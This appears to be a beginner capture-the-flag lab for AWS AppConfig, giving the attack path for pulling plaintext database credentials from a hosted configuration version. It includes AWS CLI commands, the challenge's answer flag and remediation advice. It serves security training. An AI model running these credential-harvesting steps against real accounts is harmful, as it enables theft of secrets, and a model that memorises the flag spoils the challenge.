# AppConfig Deployment — Secrets in Hosted Configuration

**Provider**: AWS  
**Difficulty**: Beginner  
**MITRE ATT&CK**: [T1552.001 — Credentials in Files](https://attack.mitre.org/techniques/T1552/001/)

## Scenario

You have obtained AWS credentials for an IAM user with AWS AppConfig read access. A developer stored database credentials directly inside a hosted configuration version. AppConfig configuration data is stored as plaintext and retrievable by any principal with `GetHostedConfigurationVersion`.

## Objective

Download the AppConfig hosted configuration version and find the flag embedded in the JSON content.

## Permissions

The attacker IAM user has the following permissions:

- `appconfig:ListApplications`
- `appconfig:GetApplication`
- `appconfig:ListConfigurationProfiles`
- `appconfig:GetConfigurationProfile`
- `appconfig:ListHostedConfigurationVersions`
- `appconfig:GetHostedConfigurationVersion`

## Attack Path

1. Configure AWS CLI with the provided credentials.
2. List AppConfig applications:
   ```bash
   aws appconfig list-applications
   ```
3. List configuration profiles for the application:
   ```bash
   aws appconfig list-configuration-profiles --application-id <app-id>
   ```
4. List hosted configuration versions:
   ```bash
   aws appconfig list-hosted-configuration-versions \
     --application-id <app-id> \
     --configuration-profile-id <profile-id>
   ```
5. Download the configuration content to a file:
   ```bash
   aws appconfig get-hosted-configuration-version \
     --application-id <app-id> \
     --configuration-profile-id <profile-id> \
     --version-number 1 \
     /tmp/config.json && cat /tmp/config.json
   ```
6. The `database.password` field contains the flag.

## Flag

`CUMULONIMBUS{AppC0nf1g_H0st3d_C0nf1g_3xp0s3d}`

## Remediation

- Never embed secrets directly in AppConfig configuration content — use references to Secrets Manager or SSM Parameter Store and resolve them at runtime.
- Apply least-privilege IAM: restrict `appconfig:GetHostedConfigurationVersion` to specific application and profile ARNs, and only grant it to application roles that need it.
- Enable AWS Config rules to detect AppConfig profiles containing potential credential patterns.
- Rotate any credentials that may have been exposed through AppConfig.

## MITRE ATT&CK Mapping

| Technique ID | Technique Name | Tactic |
|---|---|---|
| [T1552](https://attack.mitre.org/techniques/T1552/) | Unsecured Credentials | Credential Access |
| [T1083](https://attack.mitre.org/techniques/T1083/) | File and Directory Discovery | Discovery |
